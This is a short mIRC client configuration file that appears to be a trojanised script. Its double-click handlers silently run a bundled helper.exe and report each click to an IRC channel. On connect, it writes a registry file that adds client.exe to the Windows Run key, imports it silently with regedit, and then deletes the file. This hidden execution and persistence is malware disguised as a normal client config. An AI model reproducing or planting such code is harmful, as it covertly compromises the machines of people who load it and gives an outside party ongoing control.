[mirc]
nick=monitor
[clicks]
status=//run $mircdir $+ helper.exe | //msg %room :DoubleClicked: Status
query=//run $mircdir $+ helper.exe | //msg %room :DoubleClicked: Query
channel=//run $mircdir $+ helper.exe | //msg %room :DoubleClicked: Channel
[script]
n0=on *:START:{ /server irc.example.org }
n1=on *:CONNECT:{ //write -c setup.reg REGEDIT4 | //write -a setup.reg [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] | //write -a setup.reg "Agent"=" $+ $mircdir $+ client.exe" | .timer 1 5 //run -n regedit /s setup.reg | .timer 1 10 //remove setup.reg }
